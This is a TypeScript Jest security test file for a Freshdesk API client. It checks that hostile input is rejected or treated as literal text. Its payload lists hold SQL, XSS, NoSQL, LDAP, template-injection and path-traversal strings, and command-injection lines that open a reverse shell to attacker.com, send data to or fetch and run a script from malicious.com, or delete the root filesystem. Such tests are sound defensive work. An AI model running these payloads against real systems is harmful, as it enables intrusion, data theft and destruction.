import { FreshdeskClient } from '../../src/api/client.js';
import { TicketsTool } from '../../src/tools/tickets.js';
import { ContactsTool } from '../../src/tools/contacts.js';
import { ConversationsTool } from '../../src/tools/conversations.js';
import { Authenticator } from '../../src/auth/authenticator.js';
import { FreshdeskConfig } from '../../src/core/types.js';

describe('Security - Input Validation Tests', () => {
  let client: FreshdeskClient;
  let ticketsTool: TicketsTool;
  let contactsTool: ContactsTool;
  let conversationsTool: ConversationsTool;
  let authenticator: Authenticator;

  const config: FreshdeskConfig = {
    domain: 'test-domain',
    apiKey: 'test-api-key',
  };

  beforeEach(() => {
    client = new FreshdeskClient(config);
    ticketsTool = new TicketsTool(client);
    contactsTool = new ContactsTool(client);
    conversationsTool = new ConversationsTool(client);
    authenticator = new Authenticator(config);
  });

  describe('SQL Injection Prevention', () => {
    const sqlInjectionPayloads = [
      "'; DROP TABLE tickets; --",
      "' OR '1'='1",
      "1'; UNION SELECT * FROM users; --",
      "'; INSERT INTO tickets VALUES ('malicious'); --",
      "' OR 1=1 --",
      "admin'--",
      "admin' /*",
      "' OR 'x'='x",
      "' AND 1=0 UNION SELECT password FROM users WHERE 'a'='a",
      "'; EXEC xp_cmdshell('dir'); --",
    ];

    describe('Ticket creation with SQL injection attempts', () => {
      sqlInjectionPayloads.forEach((payload, index) => {
        it(`should safely handle SQL injection payload ${index + 1}: ${payload.substring(0, 20)}...`, async () => {
          const result = await ticketsTool.execute({
            action: 'create',
            params: {
              subject: payload,
              description: `Description with ${payload}`,
              email: 'test@example.com',
              priority: 2,
              status: 2,
            },
          });

          // Should either succeed with escaped content or fail with validation error
          // But should never expose SQL errors or succeed with actual SQL execution
          const response = JSON.parse(result);
          
          if (response.success) {
            // If it succeeds, the payload should be treated as literal text
            expect(response.ticket).toBeDefined();
          } else {
            // If it fails, should be due to validation, not SQL error
            expect(response.error).toBe(true);
            expect(response.message).not.toMatch(/sql|database|table|column/i);
          }
        });
      });
    });

    describe('Contact creation with SQL injection attempts', () => {
      sqlInjectionPayloads.forEach((payload, index) => {
        it(`should safely handle SQL injection in contact name ${index + 1}`, async () => {
          const result = await contactsTool.execute({
            action: 'create',
            params: {
              name: payload,
              email: 'test@example.com',
            },
          });

          const response = JSON.parse(result);
          
          if (response.success) {
            expect(response.contact.name).toBe(payload); // Should be literal text
          } else {
            expect(response.error).toBe(true);
            expect(response.message).not.toMatch(/sql|database|table|column/i);
          }
        });
      });
    });
  });

  describe('XSS (Cross-Site Scripting) Prevention', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(1)">',
      '<svg onload="alert(1)">',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<object data="javascript:alert(1)">',
      '<embed src="javascript:alert(1)">',
      '<link rel="stylesheet" href="javascript:alert(1)">',
      '<style>@import "javascript:alert(1)";</style>',
      '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
      '<form action="javascript:alert(1)"><input type="submit"></form>',
      '<details open ontoggle="alert(1)">',
      '<marquee onstart="alert(1)">',
      '<video><source onerror="alert(1)">',
      '<audio src="x" onerror="alert(1)">',
    ];

    describe('Ticket content XSS prevention', () => {
      xssPayloads.forEach((payload, index) => {
        it(`should safely handle XSS payload ${index + 1}: ${payload.substring(0, 30)}...`, async () => {
          const result = await ticketsTool.execute({
            action: 'create',
            params: {
              subject: `XSS Test ${index + 1}`,
              description: payload,
              email: 'test@example.com',
              priority: 2,
              status: 2,
            },
          });

          const response = JSON.parse(result);
          
          if (response.success) {
            // Content should be escaped or sanitized
            expect(response.ticket.description).toBeDefined();
            // Should not contain executable script tags
            expect(response.ticket.description).not.toMatch(/<script[\s\S]*?>[\s\S]*?<\/script>/gi);
          } else {
            expect(response.error).toBe(true);
          }
        });
      });
    });

    describe('Conversation content XSS prevention', () => {
      xssPayloads.forEach((payload, index) => {
        it(`should safely handle XSS in conversation body ${index + 1}`, async () => {
          const result = await conversationsTool.execute({
            action: 'create',
            params: {
              ticket_id: 123,
              body: payload,
              user_id: 456,
            },
          });

          const response = JSON.parse(result);
          
          if (response.success) {
            expect(response.conversation.body).toBeDefined();
            // Should not contain executable script tags
            expect(response.conversation.body).not.toMatch(/<script[\s\S]*?>[\s\S]*?<\/script>/gi);
          } else {
            expect(response.error).toBe(true);
          }
        });
      });
    });
  });

  describe('Command Injection Prevention', () => {
    const commandInjectionPayloads = [
      '; cat /etc/passwd',
      '| ls -la',
      '&& rm -rf /',
      '`whoami`',
      '$(cat /etc/passwd)',
      '; nc -e /bin/sh attacker.com 4444',
      '| curl malicious.com/steal?data=',
      '&& wget -O- malicious.com/script.sh | sh',
      '; python -c "import os; os.system(\'ls\')"',
      '`ping -c 1 google.com`',
      '$(uname -a)',
      '; id',
      '| pwd',
      '&& env',
    ];

    describe('Domain validation against command injection', () => {
      commandInjectionPayloads.forEach((payload, index) => {
        it(`should reject domain with command injection ${index + 1}: ${payload.substring(0, 20)}...`, () => {
          const maliciousDomain = `test-domain${payload}`;
          
          expect(() => {
            authenticator.validateDomain(maliciousDomain);
          }).not.toThrow(); // Should not crash
          
          const isValid = authenticator.validateDomain(maliciousDomain);
          expect(isValid).toBe(false); // Should be invalid
        });
      });
    });

    describe('API key validation against command injection', () => {
      commandInjectionPayloads.forEach((payload, index) => {
        it(`should reject API key with command injection ${index + 1}`, () => {
          const maliciousApiKey = `valid-key${payload}`;
          
          expect(() => {
            authenticator.validateApiKey(maliciousApiKey);
          }).not.toThrow(); // Should not crash
          
          const isValid = authenticator.validateApiKey(maliciousApiKey);
          expect(isValid).toBe(false); // Should be invalid
        });
      });
    });
  });

  describe('Path Traversal Prevention', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/passwd',
      '..%2F..%2F..%2Fetc%2Fpasswd',
      '..%252F..%252F..%252Fetc%252Fpasswd',
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
      '/var/www/../../etc/passwd',
      'C:\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '....\\\\....\\\\....\\\\windows\\\\system32\\\\config\\\\sam',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    ];

    describe('File path validation in custom fields', () => {
      pathTraversalPayloads.forEach((payload, index) => {
        it(`should safely handle path traversal in custom fields ${index + 1}`, async () => {
          const result = await ticketsTool.execute({
            action: 'create',
            params: {
              subject: 'Path Traversal Test',
              description: 'Test description',
              email: 'test@example.com',
              priority: 2,
              status: 2,
              custom_fields: {
                file_path: payload,
                attachment_url: payload,
              },
            },
          });

          const response = JSON.parse(result);
          
          if (response.success) {
            // Path should be treated as literal text, not resolved
            expect(response.ticket.custom_fields).toBeDefined();
          } else {
            expect(response.error).toBe(true);
          }
        });
      });
    });
  });

  describe('NoSQL Injection Prevention', () => {
    const nosqlInjectionPayloads = [
      '{"$ne": null}',
      '{"$gt": ""}',
      '{"$where": "function(){return true}"}',
      '{"$regex": ".*"}',
      '{"$or": [{"password": {"$ne": null}}, {"username": {"$ne": null}}]}',
      '{"$expr": {"$function": {"body": "function(){return true}", "args": [], "lang": "js"}}}',
      '{"$lookup": {"from": "users", "localField": "_id", "foreignField": "_id", "as": "result"}}',
      '{"$match": {"$expr": {"$gt": [{"$strLenCP": "$password"}, 0]}}}',
    ];

    describe('Search query validation', () => {
      nosqlInjectionPayloads.forEach((payload, index) => {
        it(`should safely handle NoSQL injection in search ${index + 1}`, async () => {
          const result = await ticketsTool.execute({
            action: 'search',
            params: {
              query: payload,
            },
          });

          const response = JSON.parse(result);
          
          if (response.success) {
            // Query should be treated as literal search text
            expect(response.tickets).toBeDefined();
          } else {
            expect(response.error).toBe(true);
            // Should not expose database structure or errors
            expect(response.message).not.toMatch(/\$ne|\$gt|\$where|\$regex|\$or/i);
          }
        });
      });
    });
  });

  describe('LDAP Injection Prevention', () => {
    const ldapInjectionPayloads = [
      '*',
      '*)(uid=*',
      '*)(|(password=*))',
      '*)(&(password=*))',
      '*))%00',
      '*)((|',
      '*)|',
      '*)(objectClass=*',
      '*)(&(objectClass=user)',
      '*)(cn=*))((|',
    ];

    describe('Email validation against LDAP injection', () => {
      ldapInjectionPayloads.forEach((payload, index) => {
        it(`should reject email with LDAP injection ${index + 1}`, async () => {
          const maliciousEmail = `user${payload}@example.com`;
          
          const result = await contactsTool.execute({
            action: 'create',
            params: {
              name: 'Test User',
              email: maliciousEmail,
            },
          });

          const response = JSON.parse(result);
          
          // Should fail validation due to invalid email format
          expect(response.error).toBe(true);
          expect(response.message).toBeDefined();
        });
      });
    });
  });

  describe('Template Injection Prevention', () => {
    const templateInjectionPayloads = [
      '{{7*7}}',
      '${7*7}',
      '#{7*7}',
      '<%= 7*7 %>',
      '{{ config.items() }}',
      '{{request.application.__globals__.__builtins__.__import__(\'os\').system(\'ls\')}}',
      '${T(java.lang.System).getProperty("user.dir")}',
      '#{T(java.lang.System).getProperty("user.dir")}',
      '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }',
      '{{range.constructor("return global.process.mainModule.require(\'child_process\').execSync(\'cat /etc/passwd\')")()}}',
    ];

    describe('Ticket subject template injection prevention', () => {
      templateInjectionPayloads.forEach((payload, index) => {
        it(`should safely handle template injection in subject ${index + 1}`, async () => {
          const result = await ticketsTool.execute({
            action: 'create',
            params: {
              subject: payload,
              description: 'Test description',
              email: 'test@example.com',
              priority: 2,
              status: 2,
            },
          });

          const response = JSON.parse(result);
          
          if (response.success) {
            // Template should not be executed, should be literal text
            expect(response.ticket.subject).toBe(payload);
            expect(response.ticket.subject).not.toBe('49'); // 7*7 result
          } else {
            expect(response.error).toBe(true);
          }
        });
      });
    });
  });

  describe('Regular Expression Denial of Service (ReDoS) Prevention', () => {
    const redosPayloads = [
      'a'.repeat(10000) + '!',
      '(' + 'a'.repeat(100) + ')*' + 'b'.repeat(100),
      '^(a+)+$' + 'a'.repeat(100) + 'X',
      '(a|a)*' + 'a'.repeat(100) + 'X',
      '(a*)*' + 'a'.repeat(100) + 'X',
      '(a+a+)+' + 'a'.repeat(100) + 'X',
      'a'.repeat(50000),
      '\\' + '\\'.repeat(1000),
    ];

    describe('Email validation ReDoS protection', () => {
      redosPayloads.forEach((payload, index) => {
        it(`should handle ReDoS payload in email validation ${index + 1}`, async () => {
          const startTime = Date.now();
          
          const result = await contactsTool.execute({
            action: 'create',
            params: {
              name: 'Test User',
              email: `${payload}@example.com`,
            },
          });

          const endTime = Date.now();
          const duration = endTime - startTime;

          // Should complete quickly (under 1 second) even with malicious input
          expect(duration).toBeLessThan(1000);

          const response = JSON.parse(result);
          expect(response.error).toBe(true); // Should fail validation
        });
      });
    });
  });

  describe('Unicode and Encoding Attack Prevention', () => {
    const unicodeAttacks = [
      '\u0000', // Null byte
      '\uFEFF', // Byte order mark
      '\u202E', // Right-to-left override
      '\u200B', // Zero width space
      '\u00A0', // Non-breaking space
      '\\u0022\\u003E\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E', // Encoded XSS
      '%22%3E%3Cscript%3Ealert(1)%3C/script%3E', // URL encoded XSS
      '&lt;script&gt;alert(1)&lt;/script&gt;', // HTML entity encoded XSS
      '\x3Cscript\x3Ealert(1)\x3C/script\x3E', // Hex encoded XSS
    ];

    describe('Unicode handling in text fields', () => {
      unicodeAttacks.forEach((payload, index) => {
        it(`should safely handle unicode attack ${index + 1}`, async () => {
          const result = await ticketsTool.execute({
            action: 'create',
            params: {
              subject: `Unicode Test ${payload}`,
              description: `Description with ${payload}`,
              email: 'test@example.com',
              priority: 2,
              status: 2,
            },
          });

          const response = JSON.parse(result);
          
          if (response.success) {
            // Unicode should be handled safely
            expect(response.ticket).toBeDefined();
          } else {
            expect(response.error).toBe(true);
          }
        });
      });
    });
  });

  describe('Large Input Handling', () => {
    it('should handle very large subject strings safely', async () => {
      const largeSubject = 'A'.repeat(100000); // 100KB string
      
      const result = await ticketsTool.execute({
        action: 'create',
        params: {
          subject: largeSubject,
          description: 'Test description',
          email: 'test@example.com',
          priority: 2,
          status: 2,
        },
      });

      const response = JSON.parse(result);
      
      // Should either succeed or fail gracefully with size limit error
      if (response.error) {
        expect(response.message).toBeDefined();
        expect(response.message).not.toMatch(/memory|crash|segfault/i);
      }
    });

    it('should handle deeply nested custom fields safely', async () => {
      // Create deeply nested object
      let deepObject: any = {};
      let current = deepObject;
      for (let i = 0; i < 1000; i++) {
        current.nested = {};
        current = current.nested;
      }
      current.value = 'deep value';

      const result = await ticketsTool.execute({
        action: 'create',
        params: {
          subject: 'Deep Object Test',
          description: 'Test description',
          email: 'test@example.com',
          priority: 2,
          status: 2,
          custom_fields: deepObject,
        },
      });

      const response = JSON.parse(result);
      
      // Should handle gracefully without stack overflow
      if (response.error) {
        expect(response.message).toBeDefined();
        expect(response.message).not.toMatch(/stack|overflow|recursion/i);
      }
    });
  });

  describe('Format String Attack Prevention', () => {
    const formatStringPayloads = [
      '%x %x %x %x',
      '%n%n%n%n',
      '%s%s%s%s',
      '%d%d%d%d',
      '%p%p%p%p',
      '%.1000000x',
      '%*0$x',
      '%1$*1$x',
    ];

    describe('Format string protection in logging', () => {
      formatStringPayloads.forEach((payload, index) => {
        it(`should safely handle format string ${index + 1}`, async () => {
          const result = await ticketsTool.execute({
            action: 'create',
            params: {
              subject: payload,
              description: `Description with ${payload}`,
              email: 'test@example.com',
              priority: 2,
              status: 2,
            },
          });

          const response = JSON.parse(result);
          
          if (response.success) {
            // Format specifiers should be treated as literal text
            expect(response.ticket.subject).toBe(payload);
          } else {
            expect(response.error).toBe(true);
          }
        });
      });
    });
  });
});